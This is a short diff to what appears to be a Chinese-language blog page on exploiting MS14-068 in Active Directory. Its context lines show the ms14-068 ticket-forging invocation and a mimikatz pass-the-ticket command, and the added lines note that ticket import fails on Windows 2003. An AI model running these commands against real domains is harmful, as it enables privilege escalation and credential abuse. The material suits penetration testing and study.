@@ -83,6 +83,8 @@ ms14-068 /user:<userName> /domain:<domainName> /dc:<domainControllerAddr> /sid:<
 ```
 mimikatz "kerberos::ptt ticket.kirbi" "exit"
 ```
+
+注意如果在 windows 2003 中是无法通过 `kerberos::ptt` 和 `kerberos::ptc` 来导入凭据的.
 <!-- markdown end -->
 </xmp>
 <div class="entry" id="main">
@@ -140,6 +142,8 @@ mimikatz "kerberos::ptt ticket.kirbi" "exit"
 
 <pre><code>mimikatz "kerberos::ptt ticket.kirbi" "exit"
 </code></pre>
+
+<p>注意如果在 windows 2003 中是无法通过 <code>kerberos::ptt</code> 和 <code>kerberos::ptc</code> 来导入凭据的.</p>
 <!-- content end -->
 </div>
 <br>
